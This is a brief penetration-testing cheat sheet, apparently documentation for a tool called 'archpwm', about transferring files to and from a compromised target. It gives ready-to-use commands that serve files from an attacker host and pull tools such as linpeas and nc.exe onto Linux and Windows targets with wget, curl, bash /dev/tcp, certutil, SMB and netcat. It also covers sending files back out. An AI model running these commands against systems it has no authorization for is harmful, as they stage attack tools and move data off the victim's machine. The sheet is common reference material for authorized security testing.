# File transfers

> Authorized use only. Get files on/off a target once you have a foothold.
> archpwm shortcut for the server side: `serve [port]`.

## Serve from your box

```bash
python3 -m http.server 8000          # or: serve 8000   (archpwm)
impacket-smbserver share . -smb2support        # SMB, great for Windows
python3 -m pyftpdlib -p 21 -w                   # writable FTP
```

## Download — Linux target

```bash
wget http://10.10.14.5:8000/linpeas.sh -O /tmp/l.sh
curl http://10.10.14.5:8000/l.sh -o /tmp/l.sh
# no wget/curl? use bash /dev/tcp or the netcat method below
exec 3<>/dev/tcp/10.10.14.5/8000; echo -e "GET /f\r\n" >&3; cat <&3
```

## Download — Windows target

```powershell
iwr -Uri http://10.10.14.5:8000/nc.exe -OutFile C:\Windows\Temp\nc.exe
certutil -urlcache -f http://10.10.14.5:8000/nc.exe nc.exe
# from an SMB share (impacket-smbserver):
copy \\10.10.14.5\share\nc.exe .
```

## netcat (no HTTP)

```bash
# receiver:
nc -lvnp 9001 > incoming.bin
# sender:
nc 10.10.14.5 9001 < file.bin
```

## Copy-paste (tiny files, no network path)

```bash
base64 -w0 file            # on source, copy the blob
echo <blob> | base64 -d > file   # on target
# integrity check both ends:
md5sum file
```

`scp user@host:/path .` when you already have SSH.
